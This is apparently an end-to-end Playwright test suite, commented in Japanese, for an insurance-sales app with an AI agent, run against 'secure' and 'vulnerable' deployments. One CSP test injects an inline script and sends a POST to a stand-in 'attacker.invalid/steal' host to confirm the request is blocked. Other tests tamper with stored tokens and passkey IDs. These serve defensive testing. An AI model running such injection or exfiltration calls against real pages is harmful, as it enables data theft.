// 画面の基本の流れ: ログイン → passkey と受信箱の登録 → 相談 → 署名を確かめた案 → 確認 → 署名 → 提出 → 直送の照合（architecture の 3 章）。
// ブラウザは入口を通り、トークンと DPoP の鍵と passkey は、ブラウザの中にある（D-18）。secure では、本物の Claude が案を示す。
import type { Page } from "playwright-core";
import { afterEach, describe, expect, it } from "vitest";
import { publicOrigin, records, setDefenses, type Ns } from "../cluster/world.ts";
import { BrowserAuditor, BrowserCustomer, PLANS } from "./browser.ts";

let alice: BrowserCustomer | undefined;
let auditor: BrowserAuditor | undefined;
afterEach(async () => {
  await alice?.close();
  await auditor?.close();
  alice = undefined;
  auditor = undefined;
});

describe.each<Ns>(["secure", "vulnerable"])("画面の基本の流れ（%s）", (ns) => {
  it("顧客が画面で選んで署名した案が記録され、直接届いた契約内容と照合で一致する", async () => {
    if (ns === "vulnerable") await setDefenses({});
    alice = await new BrowserCustomer(ns, "alice").ready();
    await alice.chat();
    expect(await alice.error()).toBeNull();
    expect(await alice.offerWarning()).toBeNull();

    // secure の案は、本物の Claude が組み立てるので、番号を固定せず、出た案から選ぶ
    const chosen = ns === "secure" ? (await alice.shownPlans())[0]! : PLANS["fixed-60"]!;
    await alice.choose(chosen.id);
    expect(await alice.approveIfShows(chosen)).toBe(true);
    expect(await alice.error()).toBeNull();

    const nonce = await alice.nonce;
    const record = (await records(ns)).contracts.find((c) => c.contract.nonce === nonce);
    expect(record?.by).toEqual(["insurer-mcp", "sales-agent"]);
    expect(record?.contract.plan.id).toBe(chosen.id);
    // 会話の最後には、今回の申込みの行だけが出る
    expect(await alice.reconcile()).toBe("match");
    expect(await alice.page.locator("[data-testid^=reconcile-]").count()).toBe(1);
    // 「受信箱と契約」の画面にも、今回の契約が一致として出る
    expect((await alice.inbox()).status).toBe("match");

    // 監査の担当が、監査の画面で、その契約を食い違いなしと見て、会話の記録を読める（D25、D-31）
    auditor = new BrowserAuditor(ns);
    expect(await auditor.open()).toBe(200);
    const audited = await auditor.contract(nonce, (status, rows) => status === "食い違いなし" && rows > 0);
    expect(audited.status).toBe("食い違いなし");
    expect(audited.conversationRows).toBeGreaterThan(0);
    // 詳細の冒頭に、何と何を比べたかが出る
    expect(await auditor.page.getByTestId("comparison").count()).toBeGreaterThan(0);
  });
});

describe("顧客の希望から案を組み立てる（secure の本物の Claude。P-17）", () => {
  it("希望に近い案が出て、条件を変えて頼み直すと新しい提示になり、最初の文が意向確認書面に残る", async () => {
    alice = await new BrowserCustomer("secure", "alice").ready();
    const wish = "年に 80 万円を 15 年受け取れる個人年金を考えています。";
    await alice.chat(wish);
    expect(await alice.error()).toBeNull();
    // 掛け金を変えて探すので、ぴったりとは限らない。受取期間が 15 年で、年額が 80 万円の前後 1 割の案があるかを見る
    const near = (await alice.shownPlans()).map((p) => /確定年金 15年・年額(\d+)万円/.exec(p.name)?.[1]).filter(Boolean).map(Number);
    expect(near.some((man) => man >= 72 && man <= 88)).toBe(true);
    const firstNonce = await alice.page.locator("[data-testid=offers]").last().getAttribute("data-nonce");

    const page = alice.page;
    await page.getByTestId("offers-other-input").fill("掛け金をもう少し抑えた案も見たいです。");
    await page.getByTestId("offers-other-send").click();
    // 古い案は、新しい案が届くまで画面に残るので、nonce が変わるまで待つ。その間の質問には、最初の選択肢で答える
    await expect
      .poll(
        async () => {
          const ask = page.locator("[data-testid=ask-option-0]:visible:enabled");
          if (await ask.count()) await ask.click();
          return page.locator("[data-testid=offers]").last().getAttribute("data-nonce");
        },
        { timeout: 180_000, interval: 1_000 },
      )
      .not.toBe(firstNonce);
    expect(await alice.error()).toBeNull();

    const chosen = (await alice.shownPlans())[0]!;
    await alice.choose(chosen.id);
    await page.getByTestId("sign-intent").waitFor({ timeout: 120_000 });
    expect(await page.getByTestId("intent-initial-wish").textContent()).toContain(wish);
    expect(await alice.approveIfShows(chosen)).toBe(true);
    expect(await alice.reconcile()).toBe("match");
  });
});

describe("画面の CSP（D32）", () => {
  it("secure: 仕込まれたインラインのスクリプトは動かず、許していない宛先へはつなげない", async () => {
    alice = await new BrowserCustomer("secure", "alice").ready();
    const page = alice.page;
    const result = await page.evaluate(async () => {
      const script = document.createElement("script");
      script.textContent = "window.__injected = true;";
      document.head.append(script);
      const sent = await fetch("http://attacker.invalid/steal", { method: "POST", body: "x" }).then(() => "sent", (e: Error) => e.name);
      const header = await fetch("/").then((r) => r.headers.get("content-security-policy"));
      return { injected: (window as unknown as { __injected?: boolean }).__injected ?? false, sent, header };
    });
    expect(result.injected).toBe(false);
    expect(result.sent).toBe("TypeError");
    expect(result.header).toContain("script-src 'self'");
    // 画面そのものは、CSP の下で動いている（ログインと登録まで済んでいる）
    expect(await page.getByTestId("free-input").isVisible()).toBe(true);
  });
});

describe("ログインの自動更新（vulnerable の台本。P-18）", () => {
  const tokenRequests = (page: Page) => {
    const refreshes: string[] = [];
    page.on("request", (r) => {
      if (r.url().endsWith("/protocol/openid-connect/token") && r.method() === "POST" && r.postData()?.includes("grant_type=refresh_token")) refreshes.push(r.url());
    });
    return refreshes;
  };
  const say = async (page: Page, text: string) => {
    await page.getByTestId("free-input").fill(text);
    await page.getByTestId("free-send").click();
  };

  it("A の残りが短ければ、回の前に更新し、断られずに会話が続く", async () => {
    alice = await new BrowserCustomer("vulnerable", "alice").ready();
    const page = alice.page;
    // 残りの短い A に置き換えて読み直す。本物の A が送られるのは、更新できたときだけである
    await page.evaluate(() => {
      const session = JSON.parse(sessionStorage.getItem("session")!);
      const payload = btoa(JSON.stringify({ exp: Math.floor(Date.now() / 1000) + 30 })).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
      sessionStorage.setItem("session", JSON.stringify({ ...session, token: `x.${payload}.y` }));
    });
    await page.reload();
    const refreshes = tokenRequests(page);
    const statuses: number[] = [];
    page.on("response", (r) => {
      if (r.url().endsWith("/agui") && r.request().method() === "POST") statuses.push(r.status());
    });
    await say(page, "老後に備えたい");
    await page.getByTestId("ask-option-0").waitFor();
    expect(refreshes).toHaveLength(1);
    expect(statuses).toEqual([200]);
  });

  it("営業 AI エージェントが 401 を返すと、1 度だけ更新して送り直す", async () => {
    alice = await new BrowserCustomer("vulnerable", "alice").ready();
    const page = alice.page;
    const refreshes = tokenRequests(page);
    let refused = 0;
    await page.route("**/agui", async (route) => {
      if (route.request().method() === "POST" && refused++ === 0) {
        return route.fulfill({ status: 401, headers: { "access-control-allow-origin": "*" }, body: "{}" });
      }
      return route.continue();
    });
    await say(page, "老後に備えたい");
    await page.getByTestId("ask-option-0").waitFor();
    expect(refreshes).toHaveLength(1);
    expect(refused).toBe(2);
  });

  /** 画面の中で、端末の鍵で更新を頼む（取り出せない鍵なので、画面の外では署名できない）。返すのは、状態と新しい更新のトークン。 */
  const refreshInPage = (page: Page, tokenUrl: string, refreshToken: string) =>
    page.evaluate(
      async ({ tokenUrl, refreshToken }) => {
        const pair = await new Promise<CryptoKeyPair>((resolve, reject) => {
          const open = indexedDB.open("gekko-customer-app", 1);
          open.onerror = () => reject(open.error);
          open.onsuccess = () => {
            const req = open.result.transaction("keys").objectStore("keys").get("dpop");
            req.onsuccess = () => resolve(req.result as CryptoKeyPair);
            req.onerror = () => reject(req.error);
          };
        });
        const b64 = (bytes: ArrayBuffer | Uint8Array) => btoa(String.fromCharCode(...new Uint8Array(bytes as ArrayBuffer))).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
        const text = (value: unknown) => b64(new TextEncoder().encode(JSON.stringify(value)));
        const { kty, crv, x, y } = await crypto.subtle.exportKey("jwk", pair.publicKey);
        const input = `${text({ alg: "ES256", typ: "dpop+jwt", jwk: { kty, crv, x, y } })}.${text({ htm: "POST", htu: tokenUrl, jti: crypto.randomUUID(), iat: Math.floor(Date.now() / 1000) })}`;
        const signature = await crypto.subtle.sign({ name: "ECDSA", hash: "SHA-256" }, pair.privateKey, new TextEncoder().encode(input));
        const res = await fetch(tokenUrl, {
          method: "POST",
          headers: { "content-type": "application/x-www-form-urlencoded", dpop: `${input}.${b64(signature)}` },
          body: new URLSearchParams({ grant_type: "refresh_token", client_id: "customer-app", refresh_token: refreshToken }),
        });
        const body = (await res.json().catch(() => ({}))) as { refresh_token?: string; error_description?: string };
        return { status: res.status, refreshToken: body.refresh_token, error: body.error_description };
      },
      { tokenUrl, refreshToken },
    );

  it("サインアウトすると、更新のトークンは使えない（D31）", async () => {
    alice = await new BrowserCustomer("vulnerable", "alice").ready();
    const page = alice.page;
    const tokenUrl = `${publicOrigin("vulnerable", "login")}/realms/insurer/protocol/openid-connect/token`;
    const before = (await page.evaluate(() => JSON.parse(sessionStorage.getItem("session")!).refreshToken)) as string;
    // 同じ手順で、サインアウトの前には更新できる（手順の誤りで断られているのではないことを確かめる）
    const renewed = await refreshInPage(page, tokenUrl, before);
    expect(renewed.status, JSON.stringify(renewed)).toBe(200);

    await page.getByTestId("signout").click();
    await page.waitForURL(`${publicOrigin("vulnerable", "app")}/`, { timeout: 30_000 }).catch(() => undefined);
    // ログインサーバーが確認の画面を出したら、押して終わらせる
    const confirm = page.locator("input[name=confirmLogout], #kc-logout");
    if (await confirm.count()) await confirm.first().click();
    await page.getByTestId("login").waitFor({ timeout: 30_000 });

    const after = await refreshInPage(page, tokenUrl, renewed.refreshToken!);
    expect(after.status, JSON.stringify(after)).toBe(400);
  });

  it("更新できなければ、ログインし直しのカードを出す", async () => {
    alice = await new BrowserCustomer("vulnerable", "alice").ready();
    const page = alice.page;
    await page.route("**/agui", (route) =>
      route.request().method() === "POST" ? route.fulfill({ status: 401, headers: { "access-control-allow-origin": "*" }, body: "{}" }) : route.continue(),
    );
    await page.route("**/protocol/openid-connect/token", (route) => route.fulfill({ status: 400, headers: { "access-control-allow-origin": "*" }, contentType: "application/json", body: '{"error":"invalid_grant"}' }));
    await say(page, "老後に備えたい");
    await page.getByTestId("relogin").waitFor();
  });
});

describe("カードで進む申込み（vulnerable の台本）", () => {
  const start = async () => {
    await setDefenses({});
    alice = await new BrowserCustomer("vulnerable", "alice").ready();
    return alice.page;
  };
  const send = async (page: Page, text: string) => {
    await page.getByTestId("free-input").fill(text);
    await page.getByTestId("free-send").click();
  };

  it("「その他」の文が意向確認書面に出て、入力欄は許したカードにだけある", async () => {
    const page = await start();
    await send(page, "老後に備えたい");
    await expect.poll(() => page.getByTestId("ask-other-input").isVisible()).toBe(true);
    expect(await page.getByTestId("free-input").count()).toBe(0);
    await page.getByTestId("ask-other-input").fill("10 年だけ受け取りたい");
    await page.getByTestId("ask-other-send").click();
    await page.getByTestId("choose-fixed-60").waitFor();
    // 案のカードの入力欄は、条件を変えて頼み直す欄だけである。段階も進む
    expect(await page.locator("textarea:visible").count()).toBe(1);
    expect(await page.getByTestId("offers-other-input").isVisible()).toBe(true);
    expect(await page.locator("#steps li[aria-current]").getAttribute("data-step")).toBe("offers");
    expect(await page.locator("#steps li.done").getAttribute("data-step")).toBe("consult");
    await page.getByTestId("choose-fixed-60").click();
    await page.getByTestId("sign-intent").waitFor();
    expect(await page.locator("textarea:visible").count()).toBe(0);
    expect(await page.getByTestId("intent-confirm").textContent()).toContain("10 年だけ受け取りたい");
    // 終わったカードは閉じ、答えを 1 行で読める。開けば中身を読める
    const offers = page.getByTestId("offers");
    expect(await offers.getAttribute("open")).toBeNull();
    expect(await offers.locator("summary").textContent()).toContain(PLANS["fixed-60"]!.name);
  });

  it("「null」と答えても止まらない", async () => {
    const page = await start();
    await send(page, "老後に備えたい");
    await page.getByTestId("ask-other-input").fill("null");
    await page.getByTestId("ask-other-send").click();
    await page.getByTestId("choose-fixed-60").waitFor();
  });

  it("道具なしで番が終わると、続きのカードが出て、そこから案へ進める", async () => {
    const page = await start();
    await send(page, "契約の一覧を見せて");
    await page.locator("[data-tool=continue] .agent").waitFor();
    expect(await page.locator("[data-tool=continue] .agent").textContent()).toMatch(/契約は \d+ 件/);
    await send(page, "老後に備えたい");
    await page.getByTestId("ask-option-0").waitFor();
  });

  it("新しい申し込みで、案のカードから始め直し、別の nonce で申し込める。完了の後は、照合が押さなくても出る", async () => {
    const page = await start();
    expect(await page.getByTestId("new-application").isVisible()).toBe(false);
    await alice!.chat("老後に備えたい");
    const first = await alice!.nonce;
    await page.getByTestId("new-application").click();
    await page.getByTestId("free-input").waitFor();
    expect(await page.getByTestId("offers").count()).toBe(0);
    expect(await page.locator("#steps li[aria-current]").getAttribute("data-step")).toBe("consult");

    await alice!.chat("老後に備えたい");
    const second = await alice!.nonce;
    expect(second).not.toBe(first);
    await alice!.choose("fixed-60");
    expect(await alice!.approveIfShows(PLANS["fixed-60"]!)).toBe(true);
    await expect.poll(() => page.getByTestId(`reconcile-${second}`).getAttribute("data-status"), { timeout: 15_000 }).toBe("match");
    // 完了の後は、確かめずに始め直せる
    await page.getByTestId("new-application").click();
    await page.getByTestId("free-input").waitFor();
    expect(await page.getByTestId("new-confirm-box").isVisible()).toBe(false);
  });

  it("提出の途中の新しい申し込みは、契約になりうることを確かめてから始め直す", async () => {
    const page = await start();
    await alice!.chat("老後に備えたい");
    await alice!.choose("fixed-60");
    await page.getByTestId("sign-intent").click();
    await page.getByTestId("sign-application").waitFor();
    // 提出の要求を遅らせて、途中の状態を作る
    await page.route("**/agui", async (route) => {
      await new Promise((r) => setTimeout(r, 3000));
      await route.continue().catch(() => undefined);
    });
    await page.getByTestId("sign-application").click();
    await page.getByTestId("agent-status").and(page.locator("[data-state=busy]")).waitFor();
    await page.getByTestId("new-application").click();
    await page.getByTestId("new-confirm-box").waitFor();
    await page.getByTestId("new-back").click();
    expect(await page.getByTestId("new-confirm-box").isVisible()).toBe(false);
    await page.getByTestId("new-application").click();
    await page.getByTestId("new-confirm").click();
    await page.getByTestId("free-input").waitFor();
    expect(await page.locator("[data-tool=application]").count()).toBe(0);
  });

  it("トークンが切れると、token-guard が断り、ログインし直しへ案内する", async () => {
    const page = await start();
    // 期限切れと同じく、token-guard が断るトークンに替える
    await page.evaluate(() => {
      const session = JSON.parse(sessionStorage.getItem("session")!);
      sessionStorage.setItem("session", JSON.stringify({ ...session, token: "expired" }));
    });
    await page.reload();
    await send(page, "老後に備えたい");
    await page.getByTestId("relogin").click();
    await page.getByTestId("free-input").waitFor({ timeout: 30_000 });
    expect(await alice!.whoami()).toBe("alice");
  });

  it("署名した申込書を送れなかったときは、写しを残さない", async () => {
    const page = await start();
    await alice!.chat("老後に備えたい");
    const nonce = await alice!.nonce;
    await alice!.choose("fixed-60");
    await page.getByTestId("sign-intent").click();
    await page.getByTestId("sign-application").waitFor();
    // 提出の要求が、トークンの期限切れで断られる
    await page.route("**/agui", (route) => route.fulfill({ status: 401, headers: { "access-control-allow-origin": alice!.app }, json: { error: "expired" } }));
    await page.getByTestId("sign-application").click();
    await page.getByTestId("relogin").waitFor();
    expect(await page.evaluate(() => localStorage.getItem("copies:alice") ?? "[]")).not.toContain(nonce);
  });
});

describe("サインアウト", () => {
  it("secure: 顧客がサインアウトすると、次のログインで、ログインサーバーがまた本人を確かめる", async () => {
    alice = await new BrowserCustomer("secure", "alice").ready();
    await alice.page.getByTestId("signout").click();
    await alice.page.getByTestId("login").waitFor();
    expect(await alice.page.getByTestId("whoami").isVisible()).toBe(false);
    await alice.page.getByTestId("login").click();
    await alice.page.locator("#username").waitFor();
  });

  it("secure: ログインサーバーが再起動して鍵が替わっていても、サインアウトで行き止まりにならない", async () => {
    alice = await new BrowserCustomer("secure", "alice").ready();
    // ログインサーバーが確かめられない ID トークンを持つ状態を作る
    await alice.page.evaluate(() => {
      const session = JSON.parse(sessionStorage.getItem("session")!);
      sessionStorage.setItem("session", JSON.stringify({ ...session, idToken: "unknown" }));
    });
    await alice.page.getByTestId("signout").click();
    // ID トークンを示せないので、ログインサーバーの確認の画面で、利用者が終わらせる
    await alice.page.locator("#kc-logout").click();
    await alice.page.getByTestId("login").waitFor();
    expect(alice.page.url()).toBe(`${alice.app}/`);
  });

  it("secure: 顧客のまま監査の画面を開くと断られ、サインアウトして、同じブラウザで監査の担当に替われる", async () => {
    alice = await new BrowserCustomer("secure", "alice").ready();
    const audit = publicOrigin("secure", "audit");
    await alice.page.goto(audit);
    await alice.page.getByTestId("forbidden").waitFor();
    await alice.page.getByTestId("signout").click();
    await alice.page.locator("#username").fill("kansa");
    await alice.page.locator("#password").fill("demo");
    await alice.page.locator("button[type=submit]").click();
    await alice.page.waitForURL(`${audit}/**`);
    expect(await alice.page.locator(".who").first().textContent()).toContain("kansa");
    // 監査の担当もサインアウトすると、次に開いたときに、またログインを求められる
    await alice.page.getByTestId("signout").click();
    await alice.page.locator("#username").waitFor();
  });
});

describe("監査の画面", () => {
  it("secure: 顧客は、ログインサーバーにログインできても、監査の画面を見られない", async () => {
    auditor = new BrowserAuditor("secure", "alice");
    expect(await auditor.open()).toBe(403);
  });
});

describe("認可サーバーに登録が残っていないとき", () => {
  it("secure: ログインの後に、端末の登録が見つからないことに気付き、登録し直しに案内する", async () => {
    alice = await new BrowserCustomer("secure", "alice").ready();
    // 認可サーバーが再起動して登録を忘れた状態を、端末に存在しない passkey の識別子を置いて作る
    await alice.page.evaluate(() => {
      const key = "device:alice";
      const device = JSON.parse(localStorage.getItem(key)!);
      localStorage.setItem(key, JSON.stringify({ ...device, credentialId: "AAAAAAAAAAAAAAAAAAAAAA" }));
    });
    await alice.page.reload();
    await alice.page.getByTestId("register-note").waitFor();
    expect(await alice.page.getByTestId("register-passkey").isVisible()).toBe(true);
    // 登録し直すと、相談に戻れる
    await alice.registerPasskey();
    expect(await alice.page.getByTestId("register-note").isVisible()).toBe(false);
  });
});
